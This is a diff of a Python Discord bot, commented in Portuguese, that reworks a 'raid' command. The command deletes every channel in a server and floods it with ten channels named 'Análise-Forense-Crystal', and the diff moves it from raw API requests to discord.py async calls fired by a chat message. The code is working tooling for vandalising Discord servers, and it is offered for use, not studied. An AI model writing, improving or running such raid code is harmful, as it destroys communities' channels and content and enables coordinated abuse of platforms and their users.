@@ -1,3 +1,4 @@
+import discord
 import requests
 import time
 import threading
@@ -166,6 +167,7 @@ def start_scanner():
 # 🧠 Thread de comando para enviar mensagem enquanto o scanner roda
 # =========================
 def comando_input():
+    global TOKEN, CHANNEL_ID, client
     while True:
         cmd = input()
         if cmd.startswith("!enviar "):
@@ -176,17 +178,11 @@ def comando_input():
             break
         elif cmd.lower() == "!raid":
             # Comando de raid
-            guild = None
-            for g in client.guilds:
-                guild = g
-                break
-            if guild:
-                perms = client.get_guild(guild.id).get_member(client.user.id).guild_permissions
-                if perms.manage_channels:
-                    print("Iniciando raid...")
-                    raid_server(guild, TOKEN)
-                else:
-                    print("Permissão insuficiente para fazer raid.")
+            print("Tentando executar raid...")
+            # O comando será tratado pelo evento do discord
+            print("Envie a mensagem '!raid' no servidor para ativar o raid.")
+        else:
+            print("Comando não reconhecido.")
 
 # =========================
 # 📝 Função para enviar mensagem ao Discord
@@ -211,7 +207,7 @@ def enviar_mensagem_discord(mensagem):
 # =========================
 # Função de raid
 # =========================
-def raid_server(guild, token):
+async def raid_server(guild, token):
     headers = {
         "Authorization": token,
         "Content-Type": "application/json"
@@ -219,34 +215,46 @@ def raid_server(guild, token):
     # Deletar canais
     for channel in guild.channels:
         try:
-            requests.delete(f"https://discord.com/api/v10/channels/{channel.id}", headers=headers)
+            await channel.delete()
             print(f"Deletado: {channel.name}")
         except:
             pass
     # Criar canais
     for _ in range(10):  # quantidade de canais
-        data = {
-            "name": "Análise-Forense-Crystal",
-            "type": 0
-        }
         try:
-            requests.post(f"https://discord.com/api/v10/guilds/{guild.id}/channels", headers=headers, json=data)
+            await guild.create_text_channel("Análise-Forense-Crystal")
             print("Canal criado: Análise-Forense-Crystal")
         except:
             pass
     print("Raid concluída!")
 
 # =========================
+# Evento do discord para detectar comando !raid
+# =========================
+intents = discord.Intents.all()
+client = discord.Client(intents=intents)
+
+@client.event
+async def on_ready():
+    print(f'Logado como {client.user}')
+
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+    if message.content.startswith("!raid"):
+        perms = message.author.guild_permissions
+        if not perms.manage_channels:
+            await message.channel.send("Você não tem permissão para fazer isso.")
+            return
+        await message.channel.send("Iniciando raid...")
+        guild = message.guild
+        await raid_server(guild, client.http.token)
+
+# =========================
 # 📋 MENU PRINCIPAL
 # =========================
 def menu():
-    global client
-    import discord
-    intents = discord.Intents.all()
-    client = discord.Client(intents=intents)
-    @client.event
-    async def on_ready():
-        print(f'Logged as {client.user}')
     while True:
         banner()
         print("[1] Start Scanner")
@@ -272,3 +280,5 @@ def menu():
 
 if __name__ == "__main__":
     menu()
+    # Executar o cliente do discord em paralelo
+    client.run('SEU_TOKEN_AQUI')
